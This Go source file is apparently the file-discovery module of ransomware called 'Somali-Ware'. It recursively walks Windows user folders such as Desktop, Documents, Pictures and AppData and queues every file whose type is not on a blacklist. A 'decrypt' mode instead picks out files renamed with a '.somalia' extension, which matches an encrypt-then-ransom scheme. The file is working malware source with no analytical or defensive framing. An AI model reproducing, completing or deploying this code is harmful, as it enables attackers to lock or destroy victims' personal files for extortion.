package finder

import (
	"Somali-Ware/modules/cache"
	"Somali-Ware/modules/helpers/blacklisted"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

func Finder(decrypt bool) {
	username := os.Getenv("USERNAME")

	paths := []string{
		"C:\\Users\\" + username + "\\Desktop",
		"C:\\Users\\" + username + "\\Documents",
		"C:\\Users\\" + username + "\\Downloads",
		"C:\\Users\\" + username + "\\Pictures",
		"C:\\Users\\" + username + "\\Videos",
		"C:\\Users\\" + username + "\\Music",
		"C:\\Users\\" + username + "\\AppData",
		"C:\\Users\\Public\\Desktop",
		"C:\\Users\\Public\\Documents",
		"C:\\Users\\Public\\Downloads",
		"C:\\Users\\Public\\Pictures",
		"C:\\Users\\Public\\Videos",
		"C:\\Users\\Public\\Music",
	}

	GetFiles(paths, decrypt)
}

func GetFiles(directories []string, decrypt bool) {
	blacklistedTypes := blacklisted.Blacklisted_file_types
	filePaths := make(chan string, 100) // Buffered channel to store file paths
	var wg sync.WaitGroup
	foundFiles := make(map[string]struct{})
	var foundFilesMutex sync.Mutex

	for _, directory := range directories {
		wg.Add(1)
		go func(directory string) {
			defer wg.Done()
			walkDirectory(directory, filePaths, blacklistedTypes, 0, decrypt)
		}(directory)
	}

	go func() {
		wg.Wait()
		close(filePaths) // Close the channel when all goroutines are done
	}()

	var workerWg sync.WaitGroup

	for path := range filePaths {
		foundFilesMutex.Lock()
		if _, found := foundFiles[path]; !found {
			foundFiles[path] = struct{}{}
			foundFilesMutex.Unlock()

			workerWg.Add(1)
			go func(path string) {
				defer workerWg.Done()
				cache.CacheMutex.Lock()
				cache.Cache = append(cache.Cache, path)
				cache.CacheCond.Signal()
				cache.CacheMutex.Unlock()
			}(path)
		} else {
			foundFilesMutex.Unlock()
		}
	}

	workerWg.Wait()
}

func walkDirectory(path string, filePaths chan<- string, blacklistedTypes []string, depth int, decrypt bool) {
	if depth > 6 {
		return
	}

	files, err := os.ReadDir(path)
	if err != nil {
		log.Printf("error accessing path %q: %v\n", path, err)
		return
	}

	for _, file := range files {
		filePath := filepath.Join(path, file.Name())
		if file.IsDir() {
			walkDirectory(filePath, filePaths, blacklistedTypes, depth+1, decrypt)
		} else {
			if !strings.Contains(filePath, ".") {
				continue
			}

			fileType := strings.Split(filePath, ".")[len(strings.Split(filePath, "."))-1]

			if decrypt {
				if fileType != "somalia" {
					continue
				}
				filePaths <- filePath
			} else {
				blacklisted_new := false
				for _, blacklistedType := range blacklistedTypes {
					if fileType == blacklistedType || strings.Contains(filePath, blacklisted.Blacklisted_file) {
						blacklisted_new = true
						break
					}
				}
				if !blacklisted_new {
					filePaths <- filePath
				}
			}
		}
	}
}
